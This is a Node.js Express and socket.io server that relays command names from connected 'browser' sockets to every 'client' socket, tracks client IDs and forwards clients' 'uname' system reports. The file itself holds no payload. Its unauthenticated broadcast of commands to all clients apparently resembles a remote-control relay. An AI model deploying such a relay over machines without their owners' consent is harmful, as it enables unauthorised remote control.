var express = require('express');
var app = express();
var http = require('http');
var server = http.createServer(app);
var io = require('socket.io').listen(server);

server.listen(3000);

app.get('/', function (req, res) {
    res.sendfile(__dirname + '/index.html');
});

app.use(express.static(__dirname + '/public'));

io.sockets.on('connection', function (socket) {
    socket.on('yo', function(data) {
        if (data.type == 'client') {
            socket.join('clients');
            socket.emit('status', 'ok');

            io.sockets.in('browsers').emit('newClient', { client: socket.id });
            console.log('Got new client');
        } else if (data.type == 'browser') {
            socket.join('browsers');
            socket.emit('status', 'ok');
        }
    });

    socket.on('getClients', function(data) {
        var roomClients = io.sockets.clients('clients');

        if (roomClients.length != 0) {
            var clients = [];
            roomClients.forEach(function(client) {
                clients.push(client.id);
            });
            
            console.log('Sending clients', clients);
            io.sockets.in('browsers').emit('clientList', { clients: clients });
        } else {
            console.log('Found no clients');
        }
    });

    socket.on('uname', function(data) {
        console.log('Sending uname to browsers', data);
        io.sockets.in('browsers').emit('sendUname', data);
    });

    socket.on('send', function(data) {
        console.log('Sending', data.cmd);
        
        io.sockets.in('clients').emit(data.cmd);
    });

    socket.on('disconnect', function() {
        io.sockets.in('browsers').emit('leaveClient', { client: socket.id });
    });
    
});

